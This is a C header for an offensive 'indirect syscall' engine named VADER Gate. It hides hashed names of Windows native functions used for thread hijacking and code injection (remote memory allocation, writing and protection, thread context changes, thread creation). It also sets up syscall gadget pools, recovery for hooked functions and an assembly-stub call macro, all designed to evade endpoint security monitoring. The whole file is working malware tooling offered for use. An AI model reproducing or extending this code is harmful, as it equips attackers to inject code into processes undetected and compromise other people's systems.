/*
 * gate_vdr.h -- VADER Gate Engine (Variant B)
 * -----------------------------------------------------------------------
 * VADER / 22DIV / george wu
 *
 * Indirect syscall engine with FNV-1a hashing + ROL/XOR encrypted
 * hash constants. Structurally distinct from SithStalker v1/v2.
 *
 * Hash:    FNV-1a (basis 0x811C9DC5, prime 0x01000193)
 * Encrypt: ROL 13 then XOR 0x47474747
 * Gadgets: Pool-based rotation (8 per entry, 32 global)
 * -----------------------------------------------------------------------
 */

#ifndef VDR_GATE_H
#define VDR_GATE_H

#include <windows.h>

#ifndef NTSTATUS
#define NTSTATUS LONG
#endif

/* -----------------------------------------------------------------------
 * ENCRYPTION PARAMETERS
 * ----------------------------------------------------------------------- */

#define VDR_GATE_KEY    0x47
#define VDR_ROL_BITS    13
#define STUB_SIZE       32
#define GADGET_POOL_SIZE 8

/* -----------------------------------------------------------------------
 * PRE-COMPUTED ENCRYPTED HASH CONSTANTS
 * FNV-1a hashes, encrypted with ROL 13 + XOR 0x47474747
 * Stored as DWORDs (NOT byte arrays)
 * ----------------------------------------------------------------------- */

#define vHASH_NtOpenThread            0x41262ACC
#define vHASH_NtSuspendThread         0xFCD168F6
#define vHASH_NtResumeThread          0xC1B8DB4B
#define vHASH_NtGetContextThread      0xD2A14BFA
#define vHASH_NtSetContextThread      0x7C7BDA0B
#define vHASH_NtAllocateVirtualMemory 0xB0685E0B
#define vHASH_NtWriteVirtualMemory    0x22A10F3B
#define vHASH_NtProtectVirtualMemory  0x746390E8
#define vHASH_NtCreateThreadEx        0xF5DC1AE7
#define vHASH_NtClose                 0xA2C7EA21

/* -----------------------------------------------------------------------
 * DECRYPTION FUNCTION (inline -- ROR to undo ROL)
 * ----------------------------------------------------------------------- */

static __inline DWORD vdr_gate_decrypt(DWORD encrypted) {
    DWORD val = encrypted ^ (VDR_GATE_KEY * 0x01010101);
    return (val >> VDR_ROL_BITS) | (val << (32 - VDR_ROL_BITS));  /* ROR to undo ROL */
}

/* -----------------------------------------------------------------------
 * VDR_SYSCALL_ENTRY -- one per resolved Nt* function
 * Different field names from SithStalker's SYSCALL_ENTRY
 * ----------------------------------------------------------------------- */

typedef struct _VDR_SYSCALL_ENTRY {
    DWORD  ssn;                         /* System Service Number */
    void  *gadget;                      /* Primary syscall;ret gadget */
    void  *gadget_pool[GADGET_POOL_SIZE]; /* Pool of alternate gadgets */
    int    pool_sz;                     /* Number of valid pool entries */
    BOOL   ok;                          /* TRUE if resolved successfully */
    BOOL   hooked;                      /* TRUE if Halo recovery was used */
} VDR_SYSCALL_ENTRY;

/* -----------------------------------------------------------------------
 * VDR_GATE_TABLE -- all resolved syscalls
 * ----------------------------------------------------------------------- */

typedef struct _VDR_GATE_TABLE {
    VDR_SYSCALL_ENTRY NtOpenThread;
    VDR_SYSCALL_ENTRY NtSuspendThread;
    VDR_SYSCALL_ENTRY NtResumeThread;
    VDR_SYSCALL_ENTRY NtGetContextThread;
    VDR_SYSCALL_ENTRY NtSetContextThread;
    VDR_SYSCALL_ENTRY NtAllocateVirtualMemory;
    VDR_SYSCALL_ENTRY NtWriteVirtualMemory;
    VDR_SYSCALL_ENTRY NtProtectVirtualMemory;
    VDR_SYSCALL_ENTRY NtCreateThreadEx;
    VDR_SYSCALL_ENTRY NtClose;
    void  *global_gadgets[32];          /* Global gadget collection */
    int    gadget_count;                /* Number of global gadgets found */
} VDR_GATE_TABLE;

/* -----------------------------------------------------------------------
 * PUBLIC API -- vdr_ prefix throughout
 * ----------------------------------------------------------------------- */

int     vdr_gate_init(VDR_GATE_TABLE *tbl);
HMODULE vdr_gate_find_ntdll(void);
BOOL    vdr_gate_resolve(HMODULE ntdll, DWORD fn_hash, VDR_SYSCALL_ENTRY *ent);
DWORD   vdr_gate_hash(const char *str);

/* -----------------------------------------------------------------------
 * ASM STUBS (gate_stub_vdr.asm -- linked via ml64.exe)
 * ----------------------------------------------------------------------- */

extern void     SetSyscallVdr(DWORD ssn, void *gadget_addr);
extern NTSTATUS IndirectSyscallVdr(void);

/* -----------------------------------------------------------------------
 * VDR_GATE_CALL -- prepare + invoke in one expression
 * ----------------------------------------------------------------------- */

#define VDR_GATE_CALL(ent, ...) \
    (SetSyscallVdr((ent).ssn, (ent).gadget), \
     ((NTSTATUS(*)(void))IndirectSyscallVdr)(__VA_ARGS__))

#endif /* VDR_GATE_H */
